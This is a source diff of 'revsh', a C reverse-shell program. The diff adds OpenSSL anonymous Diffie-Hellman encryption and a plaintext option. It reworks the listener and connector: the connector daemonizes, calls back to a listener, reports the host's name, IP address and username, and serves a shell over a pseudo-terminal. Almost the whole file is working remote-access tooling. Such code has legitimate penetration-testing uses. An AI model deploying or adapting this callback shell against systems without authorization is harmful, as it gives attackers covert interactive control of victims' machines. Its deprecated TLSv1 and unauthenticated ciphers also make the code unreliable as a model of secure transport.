@@ -1,4 +1,26 @@
 
+/*
+	XXX
+
+	Fixes:
+		* fix it so you don't need the -p flag remotely.
+		* fix the error reporting from remote connector during ssl events
+		* audit / fix error reporting in general. 
+
+	Features:
+		* Add support for DHE w/RSA certs
+		* Add support for a switch to point to a different rc file.
+		* Add known good / tested architectures to the README.
+
+	* Go through with a fine fucking tooth comb. Fucking meditate on this shit!
+
+	And don't forget to update toolbin. :D
+
+
+	XXX
+*/
+
+
 /*******************************************************************************
  *
  * revsh
@@ -16,60 +38,29 @@
  *******************************************************************************/
 
 
-#define DEBUG 
+#include "revsh.h"
 
 
-#define _GNU_SOURCE
-#define _XOPEN_SOURCE
+/*******************************************************************************
+ *
+ * usage()
+ *
+ * Input: None.
+ * Output: None.
+ *
+ * Purpose: Educate the user as to the error of their ways.
+ *
+ ******************************************************************************/
+void usage(){
+	fprintf(stderr, "\nusage: %s [-l [-e ENV_ARGS] [-s SHELL]] ADDRESS PORT\n", \
+			program_invocation_short_name);
+	fprintf(stderr, "\n\t-l: Setup a listener.\n");
+	fprintf(stderr, "\t-e ENV_ARGS: Export ENV_ARGS to the remote shell. (Defaults are \"TERM\" and \"LANG\".)\n");
+	fprintf(stderr, "\t-s SHELL: Invoke SHELL as the remote shell. (Default is /bin/bash.)\n");
+	fprintf(stderr, "\n\tNote: '-e' and '-s' only work with a listener.\n\n");
 
-
-#include <ctype.h>
-#include <errno.h>
-#include <error.h>
-#include <fcntl.h>
-#include <netdb.h>
-#include <signal.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <termios.h>
-#include <unistd.h>
-
-#include <arpa/inet.h>
-
-#include <linux/limits.h>
-
-#include <sys/ioctl.h>
-#include <sys/socket.h>
-#include <sys/stat.h>
-#include <sys/types.h>
-
-
-#define DEFAULT_SHELL	"/bin/bash"
-#define DEFAULT_ENV	"TERM LANG"
-
-#define WINSIZE_BUFF_LEN	16
-
-#define UTF8_HIGH	0xc2
-#define APC	0x9f
-#define ST	0x9c
-
-// state definitions
-#define NO_EVENT				0
-#define APC_HIGH_FOUND	1
-#define DATA_FOUND			2
-#define ST_HIGH_FOUND		3
-
-#define REVSH_DIR ".revsh"
-#define RC_FILE	"rc"
-
-volatile sig_atomic_t sig_found = 0;
-
-
-void usage();
-void sig_handler(int signal);
-char **string_to_vector(char *command_string);
-int io_loop(int local_fd, int remote_fd, int listener);
+	exit(-1);
+}
 
 
 
@@ -78,14 +69,8 @@ int main(int argc, char **argv){
 	int i, retval, err_flag;
 
 	int opt;
-	int listener = 0;
 	char *shell = NULL;
 	char *env_string = NULL;
-
-	int tmp_fd, sock_fd;
-	struct addrinfo *result, *rp;
-	struct sockaddr sa;
-	socklen_t sa_len;
 
 	char *pty_name;
 	int pty_master, pty_slave;
@@ -105,12 +90,23 @@ int main(int argc, char **argv){
 
 	char tmp_char;
 
+	struct remote_io_helper io;
 
-	while((opt = getopt(argc, argv, "ls:e:")) != -1){
+  BIO *accept;
+
+
+	io.listener = 0;
+	io.encryption = ADH;
+
+	while((opt = getopt(argc, argv, "pls:e:")) != -1){
 		switch(opt){
 
+			case 'p':
+				io.encryption = PLAINTEXT;
+				break;
+
 			case 'l':
-				listener = 1;
+				io.listener = 1;
 				break;
 
 			case 'e':
@@ -137,6 +133,26 @@ int main(int argc, char **argv){
 		error(-1, errno, "calloc(%d, %d)", buff_len, (int) sizeof(char));
 	}
 
+	tmp_len = strlen(argv[optind]);
+	memcpy(buff_head, argv[optind], tmp_len);
+	buff_head[tmp_len++] = ':';
+	strcat(buff_head, argv[optind + 1]);
+
+	SSL_library_init();
+  SSL_load_error_strings();
+
+	if(io.encryption){
+		io.remote_read = &remote_read_encrypted;
+		io.remote_write = &remote_write_encrypted;
+		io.remote_printf = &remote_printf;
+	}else{
+		io.remote_read = &remote_read_plaintext;
+		io.remote_write = &remote_write_plaintext;
+		io.remote_printf = &remote_printf;
+	}
+
+
+
 	/*
 	 * Listener:
 	 * - Open a socket.
@@ -145,59 +161,100 @@ int main(int argc, char **argv){
 	 * - Send initial environment data.
 	 * - Send initial termios data.
 	 * - Set local terminal to raw. 
-	 * - Enter io_loop() for data brokering.
+	 * - Enter broker() for data brokering.
 	 * - Reset local term.
 	 * - Exit.
 	 */
-	if(listener){
+	if(io.listener){
 
-		// - Open a socket.
-		if((retval = getaddrinfo(argv[optind], argv[optind + 1], NULL, &result))){
-			error(-1, 0, "getaddrinfo(%s, %s, NULL, %lx): %s", argv[optind], \
-					argv[optind + 1], (unsigned long) &result, gai_strerror(retval));
-		}
-
-		opt = 1;
-		for(rp = result; rp != NULL; rp = rp->ai_next){
-			if((sock_fd = socket(result->ai_family, result->ai_socktype, \
-							result->ai_protocol)) == -1){
-				continue;
-			}
-			if((retval = setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &opt, \
-							sizeof(int))) != -1){
-
-				if((retval = bind(sock_fd, result->ai_addr, result->ai_addrlen)) == 0){
-					break;
-				}
-			}
-			close(sock_fd);
-		}
-
-		if(rp == NULL){
-			error(-1, 0, "Unable to bind to: %s %s\n", argv[optind], argv[optind + 1]);
-		}
-
-		// - Listen for a connection.
 		printf("Listening...");
 		fflush(stdout);
 
-		if((retval = listen(sock_fd, 1)) == -1){
-			error(-1, errno, "listen(%d, 1)", sock_fd);
-		}
-		if((tmp_fd = accept(sock_fd, result->ai_addr, &(result->ai_addrlen))) == -1){
-			error(-1, errno, "accept(%d, %lx, %lx)", sock_fd, \
-					(unsigned long) result->ai_addr, (unsigned long) &(result->ai_addrlen));
+		if(io.encryption){
+
+			if((io.ctx = SSL_CTX_new(TLSv1_server_method())) == NULL){
+				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_server_method()): %s\n", \
+						program_invocation_short_name, io.listener, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+
+			io.dh = get_dh2048();
+
+			if(!SSL_CTX_set_tmp_dh(io.ctx, io.dh)){
+				fprintf(stderr, "%s: %d: SSL_CTX_set_tmp_dh(%lx, %lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) io.ctx, (unsigned long) io.dh, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+
+			if(SSL_CTX_set_cipher_list(io.ctx, ADH_CIPHER) != 1){
+				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) io.ctx, ADH_CIPHER, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
 		}
 
-		if((retval = close(sock_fd)) == -1){
-			error(-1, errno, "close(%d)", sock_fd);
+		if((accept = BIO_new_accept(buff_head)) == NULL){
+			fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
+						program_invocation_short_name, io.listener, buff_head, strerror(errno));
+			ERR_print_errors_fp(stderr);
+			exit(-1);
 		}
-		sock_fd = tmp_fd;
 
-		freeaddrinfo(result);
+		if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
+			fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+			ERR_print_errors_fp(stderr);
+			exit(-1);
+		}
 
-		printf("\tConnected!\r\n");
-		fflush(stdout);
+		if(BIO_do_accept(accept) <= 0){
+			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+			ERR_print_errors_fp(stderr);
+			exit(-1);
+		}
+
+		if(BIO_do_accept(accept) <= 0){
+			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+			ERR_print_errors_fp(stderr);
+			exit(-1);
+		}
+
+		if((io.connect = BIO_pop(accept)) == NULL){
+			fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+			ERR_print_errors_fp(stderr);
+			exit(-1);
+		}
+
+		BIO_free(accept);
+
+		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
+			exit(-1);
+		}
+
+		if(io.encryption > PLAINTEXT){
+			if(!(io.ssl = SSL_new(io.ctx))){
+				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1); 
+			}
+
+			SSL_set_bio(io.ssl, io.connect, io.connect);
+
+			if(SSL_accept(io.ssl) < 1){
+				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+
+		}
 
 		printf("Initializing...");
 		fflush(stdout);
@@ -222,14 +279,14 @@ int main(int argc, char **argv){
 		}
 
 		tmp_len = strlen(buff_head);
-		if((io_bytes = write(sock_fd, buff_head, tmp_len)) == -1){
-			error(-1, errno, "write(%d, %lx, %d)", \
-					sock_fd, (unsigned long) buff_head, tmp_len);
+		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
+			error(-1, errno, "io.remote_write(%lx, %lx, %d)", \
+					(unsigned long) &io, (unsigned long) buff_head, tmp_len);
 		}
 
 		if(io_bytes != (buff_tail - buff_head)){
-			error(-1, 0, "write(%d, %lx, %d): Unable to write entire string.", \
-					sock_fd, (unsigned long) buff_head, buff_len);
+			error(-1, 0, "io.remote_write(%lx, %lx, %d): Unable to write entire string.", \
+					(unsigned long) &io, (unsigned long) buff_head, buff_len);
 		}
 
 		// - Send initial environment data.
@@ -287,14 +344,14 @@ int main(int argc, char **argv){
 		}
 
 		tmp_len = strlen(buff_head);
-		if((io_bytes = write(sock_fd, buff_head, tmp_len)) == -1){
-			error(-1, errno, "write(%d, %lx, %d)", \
-					sock_fd, (unsigned long) buff_head, tmp_len);
+		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
+			error(-1, errno, "io.remote_write(%lx, %lx, %d)", \
+					(unsigned long) &io, (unsigned long) buff_head, tmp_len);
 		}
 
 		if(io_bytes != (buff_tail - buff_head)){
-			error(-1, 0, "write(%d, %lx, %d): Unable to write entire string.", \
-					sock_fd, (unsigned long) buff_head, buff_len);
+			error(-1, 0, "io.remote_write(%lx, %lx, %d): Unable to write entire string.", \
+					(unsigned long) &io, (unsigned long) buff_head, buff_len);
 		}
 
 
@@ -318,14 +375,14 @@ int main(int argc, char **argv){
 		*(buff_tail++) = (char) ST;
 
 		tmp_len = strlen(buff_head);
-		if((io_bytes = write(sock_fd, buff_head, tmp_len)) == -1){
-			error(-1, errno, "write(%d, %lx, %d)", \
-					sock_fd, (unsigned long) buff_head, tmp_len);
+		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
+			error(-1, errno, "io.remote_write(%lx, %lx, %d)", \
+					(unsigned long) &io, (unsigned long) buff_head, tmp_len);
 		}
 
 		if(io_bytes != tmp_len){
-			error(-1, 0, "write(%d, %lx, %d): Unable to write entire string.", \
-					sock_fd, (unsigned long) buff_head, tmp_len);
+			error(-1, 0, "io.remote_write(%lx, %lx, %d): Unable to write entire string.", \
+					(unsigned long) &io, (unsigned long) buff_head, tmp_len);
 		}
 
 		// - Set local terminal to raw. 
@@ -353,11 +410,13 @@ int main(int argc, char **argv){
 		printf("\tDone!\r\n");
 		fflush(stdout);
 
+		io.local_fd = STDIN_FILENO;
+
 		errno = 0;
-		// - Enter io_loop() for data brokering.
-		if((retval = io_loop(STDIN_FILENO, sock_fd, listener) == -1)){
-			fprintf(stderr, "%s: io_loop(%d, %d, %d): %s\r\n", \
-					program_invocation_short_name, STDIN_FILENO, sock_fd, listener,
+		// - Enter broker() for data brokering.
+		if((retval = broker(&io) == -1)){
+			fprintf(stderr, "%s: %d: broker(%lx): %s\r\n", \
+					program_invocation_short_name, io.listener, (unsigned long) &io,
 					strerror(errno));
 		}
 
@@ -374,9 +433,16 @@ int main(int argc, char **argv){
 			printf("Good-bye!\n");
 
 		}else{
-			while((retval = read(sock_fd, buff_head, buff_len)) > 0){
+			while((retval = io.remote_read(&io, buff_head, buff_len)) > 0){
 				write(STDERR_FILENO, buff_head, retval);
 			}
+		}
+		if(io.encryption){
+			SSL_shutdown(io.ssl);
+			SSL_free(io.ssl);
+			SSL_CTX_free(io.ctx);
+		}else{
+			BIO_free(io.connect);
 		}
 
 		return(0);
@@ -394,7 +460,7 @@ int main(int argc, char **argv){
 		 * - Create a pseudo-terminal (pty).
 		 * - Send basic information back to the listener about the connecting host.
 		 * - Fork a child to run the shell.
-		 * - Parent: Enter the io_loop() and broker data.
+		 * - Parent: Enter the broker() and broker data.
 		 * - Child: Initialize file descriptors.
 		 * - Child: Set the pty as controlling.
 		 * - Child: Call execve() to invoke a shell.
@@ -405,7 +471,6 @@ int main(int argc, char **argv){
 		umask(0);
 
 
-#ifndef DEBUG
 		retval = fork();
 
 		if(retval == -1){
@@ -421,33 +486,308 @@ int main(int argc, char **argv){
 		if((retval = chdir("/")) == -1){
 			error(-1, errno, "chdir(\"/\")");
 		}
-#endif
 
-		// - Open a network connection back to a listener.
-		if((retval = getaddrinfo(argv[optind], argv[optind + 1], NULL, &result))){
-			error(-1, 0, "getaddrinfo(%s, %s, NULL, %lx): %s", argv[optind], \
-					argv[optind + 1], (unsigned long) &result, gai_strerror(retval));
-		}
+		if(io.encryption){
 
-		opt = 1;
-		for(rp = result; rp != NULL; rp = rp->ai_next){
-			if((sock_fd = socket(result->ai_family, result->ai_socktype, \
-							result->ai_protocol)) == -1){
-				continue;
+			if((io.ctx = SSL_CTX_new(TLSv1_client_method())) == NULL){
+				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_client_method()): %s\n", \
+						program_invocation_short_name, io.listener, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
 			}
-			if((retval = setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &opt, \
-							sizeof(int))) != -1){
-				if((retval = connect(sock_fd, result->ai_addr, \
-								result->ai_addrlen)) == 0){
-					break;
-				}
+
+			if(SSL_CTX_set_cipher_list(io.ctx, ADH_CIPHER) != 1){
+				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) io.ctx, ADH_CIPHER, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
 			}
-			close(sock_fd);
 		}
 
-		if(rp == NULL){
-			error(-1, 0, "Unable to bind to: %s %s\n", argv[optind], argv[optind + 1]);
+		if((io.connect = BIO_new_connect(buff_head)) == NULL){
+			fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
+					program_invocation_short_name, io.listener, buff_head, strerror(errno));
+			ERR_print_errors_fp(stderr);
+			exit(-1);
 		}
+
+		if(BIO_do_connect(io.connect) <= 0){
+			fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
+					program_invocation_short_name, io.listener, (unsigned long) io.connect, strerror(errno));
+			ERR_print_errors_fp(stderr);
+			exit(-1);
+		}
+
+		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
+			// XXX		ERR_print_errors_fp(stderr);
+			exit(-1);
+		}
+
+		if(io.encryption > PLAINTEXT){
+
+			if(!(io.ssl = SSL_new(io.ctx))){
+				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+
+			SSL_set_bio(io.ssl, io.connect, io.connect);
+
+			if((retval = SSL_connect(io.ssl)) < 1){
+				fprintf(stderr, "%s: %d: SSL_connect(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+		}
+
+		// - Check for usage and exit, if needed. 
+		// We do this after the network connect so the error
+		// reporting gets sent back to the listener, if possible.
+		if(shell || env_string){
+			io.remote_printf(&io, "\r%s: %d: remote usage error: Only listeners can invoke -s or -e!\r\n", \
+					program_invocation_short_name, io.listener);
+			exit(-1);
+		}
+
+		// - Receive and set the shell.
+		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
+			io.remote_printf(&io, "%s: %d: io.remote_read(%lx, %lx, %d): %s", \
+					program_invocation_short_name, io.listener, (unsigned long) &io, (unsigned long) &tmp_char, 1, strerror(errno));
+			exit(-1);
+		}
+
+		if(tmp_char != (char) APC){
+			io.remote_printf(&io, "%s: %d: invalid initialization: shell\r\n", program_invocation_short_name, io.listener);
+			exit(-1);
+		}
+
+		memset(buff_head, 0, buff_len);
+		buff_tail = buff_head;
+
+		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
+			io.remote_printf(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
+			exit(-1);
+		}
+
+		while(tmp_char != (char) ST){
+			*(buff_tail++) = tmp_char;
+
+			if((buff_tail - buff_head) >= buff_len){
+				io.remote_printf(&io, "%s: %d: Shell string too long.\r\n", \
+						program_invocation_short_name, io.listener);
+				exit(-1);
+			}
+
+			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
+				io.remote_printf(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
+						program_invocation_short_name, io.listener, \
+						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
+				exit(-1);
+			}
+		}
+
+		tmp_len = strlen(buff_head);
+		if((shell = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
+			io.remote_printf(&io, "%s: %d: calloc(%d, %d): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					tmp_len + 1, (int) sizeof(char), strerror(errno));
+			exit(-1);
+		}
+		memcpy(shell, buff_head, tmp_len);
+
+
+		// - Receive and set the initial environment.
+		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
+			io.remote_printf(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
+			exit(-1);
+		}
+
+		if(tmp_char != (char) APC){
+			io.remote_printf(&io, "%s: %d: invalid initialization: environment\r\n", \
+					program_invocation_short_name, io.listener);
+			exit(-1);
+		}
+
+		memset(buff_head, 0, buff_len);
+		buff_tail = buff_head;
+
+		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
+			io.remote_printf(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
+			exit(-1);
+		}
+
+		while(tmp_char != (char) ST){
+			*(buff_tail++) = tmp_char;
+
+			if((buff_tail - buff_head) >= buff_len){
+				io.remote_printf(&io, "%s: %d: Environment string too long.\r\n", \
+						program_invocation_short_name, io.listener);
+				exit(-1);
+			}
+
+			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
+				io.remote_printf(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
+						program_invocation_short_name, io.listener, \
+						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
+				exit(-1);
+			}
+		}
+
+		if((exec_envp = string_to_vector(buff_head)) == NULL){
+			io.remote_printf(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					buff_head, strerror(errno));
+			exit(-1);
+		}
+
+		// - Receive and set the initial termios.
+		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
+			io.remote_printf(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
+			exit(-1);
+		}
+
+		if(tmp_char != (char) APC){
+			io.remote_printf(&io, "%s: %d: invalid initialization: termios\r\n", \
+					program_invocation_short_name, io.listener);
+			exit(-1);
+		}
+
+		memset(buff_head, 0, buff_len);
+		buff_tail = buff_head;
+
+		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
+			io.remote_printf(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
+			exit(-1);
+		}
+
+		while(tmp_char != (char) ST){
+			*(buff_tail++) = tmp_char;
+
+			if((buff_tail - buff_head) >= buff_len){
+				io.remote_printf(&io, "%s: %d: termios string too long.\r\n", \
+						program_invocation_short_name, io.listener);
+				exit(-1);
+			}
+
+			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
+				io.remote_printf(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
+						program_invocation_short_name, io.listener, \
+						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
+				exit(-1);
+			}
+		}
+
+		if((tmp_vector = string_to_vector(buff_head)) == NULL){
+			io.remote_printf(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					strerror(errno));
+			exit(-1);
+		}
+
+		if(tmp_vector[0] == NULL){
+			io.remote_printf(&io, "%s: %d: invalid initialization: tty_winsize.ws_row\r\n", \
+					program_invocation_short_name, io.listener);
+			exit(-1);
+		}
+
+		errno = 0;
+		tty_winsize.ws_row = strtol(tmp_vector[0], NULL, 10);
+		if(errno){
+			io.remote_printf(&io, "%s: %d: strtol(%s): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					strerror(errno));
+			exit(-1);
+		}
+
+		if(tmp_vector[1] == NULL){
+			io.remote_printf(&io, "%s: %d: invalid initialization: tty_winsize.ws_col\r\n", \
+					program_invocation_short_name, io.listener);
+			exit(-1);
+		}
+
+		errno = 0;
+		tty_winsize.ws_col = strtol(tmp_vector[1], NULL, 10);
+		if(errno){
+			io.remote_printf(&io, "%s: %d: strtol(%s): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					strerror(errno));
+			exit(-1);
+		}
+
+		// - Create a pseudo-terminal (pty).
+		if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
+			io.remote_printf(&io, "%s: %d: posix_openpt(O_RDWR|O_NOCTTY): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					strerror(errno));
+			exit(-1);
+		}
+
+		if((retval = grantpt(pty_master)) == -1){
+			io.remote_printf(&io, "%s: %d: grantpt(%d): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					pty_master, strerror(errno));
+			exit(-1);
+		}
+
+		if((retval = unlockpt(pty_master)) == -1){
+			io.remote_printf(&io, "%s: %d: unlockpt(%d): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					pty_master, strerror(errno));
+			exit(-1);
+		}
+
+		if((retval = ioctl(pty_master, TIOCSWINSZ, &tty_winsize)) == -1){
+			io.remote_printf(&io, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					pty_master, TIOCGWINSZ, (unsigned long) &tty_winsize, strerror(errno));
+			exit(-1);
+		}
+
+		if((pty_name = ptsname(pty_master)) == NULL){
+			io.remote_printf(&io, "%s: %d: ptsname(%d): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					pty_master, strerror(errno));
+			exit(-1);
+		}
+
+		if((pty_slave = open(pty_name, O_RDWR|O_NOCTTY)) == -1){
+			io.remote_printf(&io, "%s: %d: open(%s, O_RDWR|O_NOCTTY): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					pty_name, strerror(errno));
+			exit(-1);
+		}
+
+		// - Send basic information back to the listener about the connecting host.
+		//   (e.g. hostname, ip address, username)
+		memset(buff_head, 0, buff_len);
+		if((retval = gethostname(buff_head, buff_len - 1)) == -1){
+			io.remote_printf(&io, "%s: %d: gethostname(%lx, %d): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					(unsigned long) buff_head, buff_len - 1, strerror(errno));
+			exit(-1);
+		}
+
+		io.remote_printf(&io, "################################\r\n");
+		io.remote_printf(&io, "# hostname: %s\r\n", buff_head);
+
+		io.ip_addr = BIO_get_conn_ip(io.connect);
+		io.remote_printf(&io, "# ip address: %d.%d.%d.%d\r\n", io.ip_addr[0], io.ip_addr[1], io.ip_addr[2], io.ip_addr[3]);
+
+		io.remote_printf(&io, "# username: %s\r\n", getenv("LOGNAME"));
+		io.remote_printf(&io, "################################\r\n");
+
 
 		if((retval = close(STDIN_FILENO)) == -1){
 			error(-1, errno, "close(STDIN_FILENO)");
@@ -457,285 +797,84 @@ int main(int argc, char **argv){
 			error(-1, errno, "close(STDOUT_FILENO)");
 		}
 
-#ifndef DEBUG
 		if((retval = close(STDERR_FILENO)) == -1){
 			error(-1, errno, "close(STDERR_FILENO)");
 		}
 
-		if((retval = dup2(sock_fd, STDERR_FILENO)) == -1){
-			exit(-2);
-		}
-
-#endif
-
-		if((retval = dup2(sock_fd, STDOUT_FILENO)) == -1){
-			error(-1, errno, "dup2(%d, STDOUT_FILENO)", sock_fd);
-		}
-
-		// - Check for usage and exit, if needed. 
-		// We do this after the network connect so the error
-		// reporting gets sent back to the listener, if possible.
-		if(shell || env_string){
-
-			fprintf(stderr, \
-					"\r%s: remote usage error: Only listeners can invoke -s or -e!\r\n", \
-					program_invocation_short_name);
-			fflush(stderr);
-			exit(-1);
-		}
-
-		// - Receive and set the shell.
-		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-			error(-1, errno, "read(%d, %lx, %d)", \
-					sock_fd, (unsigned long) &tmp_char, 1);
-		}
-
-		if(tmp_char != (char) APC){
-			error(-1, 0, "invalid initialization: shell");
-		}
-
-		memset(buff_head, 0, buff_len);
-		buff_tail = buff_head;
-
-		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-			error(-1, errno, "read(%d, %lx, %d)", \
-					sock_fd, (unsigned long) &tmp_char, 1);
-		}
-
-		while(tmp_char != (char) ST){
-			*(buff_tail++) = tmp_char;
-
-			if((buff_tail - buff_head) >= buff_len){
-				error(-1, 0, "Shell string too long.");
-			}
-
-			if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-				error(-1, errno, "read(%d, %lx, %d)", \
-						sock_fd, (unsigned long) &tmp_char, 1);
-			}
-		}
-
-		tmp_len = strlen(buff_head);
-		if((shell = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
-			error(-1, errno, "calloc(%d, %d)", \
-					tmp_len + 1, (int) sizeof(char));
-		}
-		memcpy(shell, buff_head, tmp_len);
-
-
-		// - Receive and set the initial environment.
-		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-			error(-1, errno, "read(%d, %lx, %d)", \
-					sock_fd, (unsigned long) &tmp_char, 1);
-		}
-
-		if(tmp_char != (char) APC){
-			error(-1, 0, "invalid initialization: environment");
-		}
-
-		memset(buff_head, 0, buff_len);
-		buff_tail = buff_head;
-
-		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-			error(-1, errno, "read(%d, %lx, %d)", \
-					sock_fd, (unsigned long) &tmp_char, 1);
-		}
-
-		while(tmp_char != (char) ST){
-			*(buff_tail++) = tmp_char;
-
-			if((buff_tail - buff_head) >= buff_len){
-				error(-1, 0, "Environment string too long.");
-			}
-
-			if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-				error(-1, errno, "read(%d, %lx, %d)", \
-						sock_fd, (unsigned long) &tmp_char, 1);
-			}
-		}
-
-		if((exec_envp = string_to_vector(buff_head)) == NULL){
-			error(-1, errno, "string_to_vector(%s)", buff_head);
-		}
-
-		// - Receive and set the initial termios.
-		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-			error(-1, errno, "read(%d, %lx, %d)", \
-					sock_fd, (unsigned long) &tmp_char, 1);
-		}
-
-		if(tmp_char != (char) APC){
-			error(-1, 0, "invalid initialization: termios");
-		}
-
-		memset(buff_head, 0, buff_len);
-		buff_tail = buff_head;
-
-		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-			error(-1, errno, "read(%d, %lx, %d)", \
-					sock_fd, (unsigned long) &tmp_char, 1);
-		}
-
-		while(tmp_char != (char) ST){
-			*(buff_tail++) = tmp_char;
-
-			if((buff_tail - buff_head) >= buff_len){
-				error(-1, 0, "termios string too long.");
-			}
-
-			if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-				error(-1, errno, "read(%d, %lx, %d)", \
-						sock_fd, (unsigned long) &tmp_char, 1);
-			}
-		}
-
-		if((tmp_vector = string_to_vector(buff_head)) == NULL){
-			error(-1, errno, "string_to_vector(%s)", buff_head);
-		}
-
-		if(tmp_vector[0] == NULL){
-			error(-1, 0, "invalid initialization: tty_winsize.ws_row");
-		}
-
-		errno = 0;
-		tty_winsize.ws_row = strtol(tmp_vector[0], NULL, 10);
-		if(errno){
-			error(-1, errno, "strtol(%s)", tmp_vector[0]);
-		}
-
-		if(tmp_vector[1] == NULL){
-			error(-1, 0, "invalid initialization: tty_winsize.ws_col");
-		}
-
-		errno = 0;
-		tty_winsize.ws_col = strtol(tmp_vector[1], NULL, 10);
-		if(errno){
-			error(-1, errno, "strtol(%s)", tmp_vector[1]);
-		}
-
-		// - Create a pseudo-terminal (pty).
-		if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
-			error(-1, errno, "posix_openpt(O_RDWR|O_NOCTTY)");
-		}
-
